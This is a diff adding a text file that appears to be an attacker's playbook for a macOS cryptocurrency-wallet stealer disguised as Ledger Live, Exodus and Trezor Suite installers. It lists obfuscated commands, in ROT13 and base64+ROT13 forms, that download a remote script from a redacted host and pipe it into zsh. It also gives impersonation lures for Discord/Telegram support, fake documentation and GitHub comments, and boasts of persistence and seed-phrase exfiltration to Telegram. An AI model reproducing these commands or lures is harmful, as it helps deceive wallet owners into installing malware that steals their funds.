@@ -1,0 +1,105 @@
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+          COPY-PASTE READY: OBFUSCATED INSTALL COMMANDS
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+METHOD 1: ROT13 OBFUSCATION (RECOMMENDED)
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+LEDGER LIVE:
+echo 'phey -sfFY uggc://redacted:8080/vafgnyy.fu | mfu' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | zsh
+
+EXODUS:
+echo 'phey -sfFY uggc://redacted:8080/vafgnyy-rkcbqhf.fu | mfu' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | zsh
+
+TREZOR SUITE:
+echo 'phey -sfFY uggc://redacted:8080/vafgnyy-germbe.fu | mfu' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | zsh
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+METHOD 2: BASE64 + ROT13 (MAXIMUM STEALTH)
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+LEDGER LIVE:
+echo 'cGhleSAtc2ZGWSB1Z2djOi8vcmVkYWN0ZWQ6ODA4MC92YWZnbnl5LmZ1IHwgbWZ1Cgo=' | base64 -d | tr 'a-zA-Z' 'n-za-mN-ZA-M' | zsh
+
+EXODUS:
+echo 'cGhleSAtc2ZGWSB1Z2djOi8vcmVkYWN0ZWQ6ODA4MC92YWZnbnl5LXJrYnFoZi5mdSB8IG1mdQo=' | base64 -d | tr 'a-zA-Z' 'n-za-mN-ZA-M' | zsh
+
+TREZOR SUITE:
+echo 'cGhleSAtc2ZGWSB1Z2djOi8vcmVkYWN0ZWQ6ODA4MC92YWZnbnl5LWdlcm1iZS5mdSB8IG1mdQ==' | base64 -d | tr 'a-zA-Z' 'n-za-mN-ZA-M' | zsh
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+METHOD 3: PLAIN (NO OBFUSCATION)
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+LEDGER LIVE:
+curl -fsSL http://redacted:8080/install.sh | zsh
+
+EXODUS:
+curl -fsSL http://redacted:8080/install-exodus.sh | zsh
+
+TREZOR SUITE:
+curl -fsSL http://redacted:8080/install-trezor.sh | zsh
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+WHAT VICTIM SEES IN SHELL HISTORY
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+METHOD 1 (ROT13):
+  echo 'phey -sfFY uggc://redacted:8080/vafgnyy.fu | mfu' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | zsh
+  â†‘ Looks like gibberish, but still shows IP address
+
+METHOD 2 (BASE64+ROT13):
+  echo 'cGhleSAtc2ZGWSB1Z2djOi8vcmVkYWN0ZWQ6ODA4MC92YWZnbnl5LmZ1IHwgbWZ1==' | base64 -d | tr 'a-zA-Z' 'n-za-mN-ZA-M' | zsh
+  â†‘ Complete gibberish, IP hidden, looks like encrypted data
+
+METHOD 3 (PLAIN):
+  curl -fsSL http://redacted:8080/install.sh | zsh
+  â†‘ Obvious malicious command, IP visible
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+SOCIAL ENGINEERING EXAMPLES
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+DISCORD/TELEGRAM SUPPORT IMPERSONATION:
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+"Hi! We've detected unusual activity on your wallet. Please run
+this security update command immediately:
+
+echo 'phey -sfFY uggc://redacted:8080/vafgnyy.fu | mfu' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | zsh
+
+This uses advanced encryption to protect your data during the update."
+
+
+FAKE DOCUMENTATION PAGE:
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+"Installation (macOS)
+
+For enhanced security, we use encoded installation commands:
+
+echo 'cGhleSAtc2ZGWSB1Z2djOi8vcmVkYWN0ZWQ6ODA4MC92YWZnbnl5LmZ1IHwgbWZ1' | base64 -d | tr 'a-zA-Z' 'n-za-mN-ZA-M' | zsh
+
+This prevents man-in-the-middle attacks during installation."
+
+
+GITHUB ISSUE COMMENT:
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+"If you're having connection issues, try the beta installer:
+
+echo 'phey -sfFY uggc://redacted:8080/vafgnyy.fu | mfu' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | zsh
+
+This version includes fixes for the latest macOS updates."
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+FEATURES AFTER INSTALLATION
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+âœ“ Auto-starts on login (LaunchAgent)
+âœ“ Survives reboots permanently
+âœ“ Restarts if user quits (KeepAlive)
+âœ“ Hijacks real app via bundle ID
+âœ“ Captures seed phrases â†’ Telegram
+âœ“ Formatted messages with location/IP/time
+âœ“ JavaScript fully obfuscated
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
